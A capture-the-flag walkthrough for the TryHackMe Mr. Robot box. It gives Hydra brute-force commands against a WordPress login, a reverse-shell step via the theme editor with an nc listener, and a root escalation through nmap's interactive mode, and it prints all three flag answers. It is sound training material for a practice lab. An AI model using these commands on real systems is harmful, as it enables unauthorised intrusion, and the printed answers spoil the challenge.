# TryHackMe: Mr. Robot CTF

**Category:** Web Exploitation / Full-Box CTF
**Tooling:** Nmap, dirsearch, Hydra, WordPress, Nmap interactive shell breakout
**Techniques:** Directory enumeration, brute-force credential attacks, privilege escalation via SUID/interactive binary

---

## Overview

A Mr. Robot-themed CTF box with three flags hidden behind progressively deeper access: an easily discoverable first key via web enumeration, a WordPress admin compromise via brute force for the second, and a privilege escalation to root for the third.

---

## 1. Recon

Ran an **Nmap** scan against the target to identify open ports and services, then followed up with **dirsearch** for directory/file enumeration (preferred over gobuster for simpler syntax).

Following a hint pointing toward `robots.txt`, found a listed directory that led to `key-1-of-3.txt`.

---

## 2. Investigation

### Q1 — Key 1

Found by traversing to the disclosed path from `robots.txt` — straightforward enumeration, no exploitation needed.

**Answer:**
```
073403c8a58a1f80d943455fb30724b9
```

---

### Q2 — Key 2

Discovered a WordPress login page. Default/common credentials (`admin/admin`, basic SQLi login bypass) did not work, so pivoted to brute-forcing valid credentials with **Hydra**.

**Step 1 — Brute-force the username** using the provided `fsocity_uniq.txt` wordlist against the login field, filtering on the "Invalid username" error string:

```bash
hydra -L fsocity_uniq.txt -p test 10.130.180.226 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

Result — valid username found (case variants of `elliot`):
```
login: elliot   password: test
```

**Step 2 — Brute-force the password** for the confirmed username, filtering on the "password you entered" error string:

```bash
hydra -l elliot -P fsocity_uniq.txt 10.130.180.226 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

Result:
```
login: elliot   password: ER28-0652
```

Logged into WordPress admin with these credentials. From the **Appearance** section, found a way to inject a reverse shell payload (via the theme editor), then caught the callback:

```bash
nc -lnvp 1234
```

From the resulting shell, found `password.raw-md5` alongside the key file — cracked the MD5 hash to recover the `robot` user's plaintext password: `abcdefghijklmnopqrstuvwxyz`.

**Answer:**
```
822c73956184f694993bede3eb39f959
```

---

### Q3 — Key 3 (Privilege Escalation)

With access as `robot`, found `/usr/local/bin/nmap` was runnable with elevated privileges. Since this older Nmap version supports an **interactive mode**, it can be abused to break out into a root shell:

```bash
/usr/local/bin/nmap --interactive
```

Inside the interactive Nmap prompt:
```
nmap> !sh
```

This dropped into a root shell (`root@ip-10-130-180-226`). From there, navigated to `/root` and read the final key:

```bash
cd /root
cat key-3-of-3.txt
```

**Answer:**
```
04787ddef27c3dee1ee161b21670b4e4
```

---

## Key Lesson

This box strings together three distinct skill areas: basic **web enumeration** (robots.txt disclosure), **credential brute-forcing** against a CMS login with a targeted, error-message-aware Hydra approach (splitting username and password brute-force into separate passes rather than one combined attack), and classic **GTFOBins-style privilege escalation** — abusing a legitimately-runnable-as-root binary's interactive/shell-escape feature (`nmap --interactive` → `!sh`) rather than needing any kernel exploit. A good reminder to always check `sudo -l` or SUID binaries for known interactive-mode escape techniques before reaching for more complex privesc paths.
